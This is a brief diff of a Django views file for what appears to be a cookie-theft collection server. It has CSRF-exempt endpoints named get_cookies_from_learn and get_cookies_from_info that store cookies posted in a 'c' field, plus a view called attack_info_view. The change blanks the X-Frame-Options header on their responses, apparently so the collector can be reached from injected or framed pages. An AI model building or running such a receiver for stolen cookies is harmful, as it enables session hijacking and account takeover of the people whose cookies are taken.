@@ -11,7 +11,9 @@ def get_cookies_from_learn(request):
         cookie.cookie = request.POST['c']
         cookie.type = 0
         cookie.save()
-        return JsonResponse({"return_code": 0})
+        response = JsonResponse({"return_code": 0})
+        response["X-Frame-Options"] = ""
+        return response
 
 @csrf_exempt
 def attack_info_view(request):
@@ -28,7 +30,9 @@ def get_cookies_from_info(request):
         cookie.cookie = request.POST['c']
         cookie.type = 1
         cookie.save()
-        return JsonResponse({"return_code": 0})
+        response = JsonResponse({"return_code": 0})
+        response["X-Frame-Options"] = ""
+        return response
 
 
 # Create your views here.
